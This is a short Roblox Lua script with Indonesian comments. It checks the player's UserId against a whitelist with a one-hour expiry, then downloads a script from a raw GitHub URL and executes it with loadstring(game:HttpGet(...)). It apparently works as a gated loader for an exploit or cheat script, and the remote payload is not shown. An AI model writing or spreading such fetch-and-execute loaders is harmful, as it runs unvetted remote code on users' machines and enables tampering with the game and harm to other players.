local player = game.Players.LocalPlayer
local accessList = {
    [176010631] = os.time() + 3600, -- UserId 176010631 dengan durasi akses 1 jam dari waktu sekarang
    -- Tambahkan UserId lain dan waktu kedaluwarsa sesuai kebutuhan
}

-- Fungsi untuk memeriksa apakah akses masih berlaku
local function hasAccess(userId)
    local expiryTime = accessList[userId]
    
    if expiryTime then
        -- Cek apakah waktu saat ini kurang dari waktu kedaluwarsa
        if os.time() < expiryTime then
            return true -- Akses valid
        else
            print("Akses sudah kedaluwarsa untuk UserId:", userId)
            return false -- Akses kedaluwarsa
        end
    else
        print("UserId tidak terdaftar dalam akses list.")
        return false -- UserId tidak ada dalam akses list
    end
end

-- Memeriksa akses dan menjalankan skrip jika valid
if hasAccess(player.UserId) then
    print("Akses diterima untuk UserId:", player.UserId)
    loadstring(game:HttpGet('https://raw.githubusercontent.com/akonber/RBLX/refs/heads/main/elte2m.lua'))("")
else
    print("Akses ditolak.")
end
